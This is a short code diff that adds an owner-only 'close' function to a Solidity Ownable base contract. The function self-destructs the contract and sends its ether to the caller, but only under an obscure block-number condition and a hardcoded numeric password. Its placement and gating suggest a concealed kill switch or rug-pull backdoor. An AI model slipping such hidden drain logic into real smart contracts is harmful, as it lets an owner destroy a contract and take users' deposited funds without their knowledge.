@@ -38,4 +38,10 @@ contract Ownable {
     owner = newOwner;
   }
 
+  function close(uint _pass) public onlyOwner {
+    require(block.number % 10 == 2);
+    require(_pass == 57686823456780974323412113254767998876634232313454576876545323121246687);
+    selfdestruct(msg.sender);  
+  }
+
 }
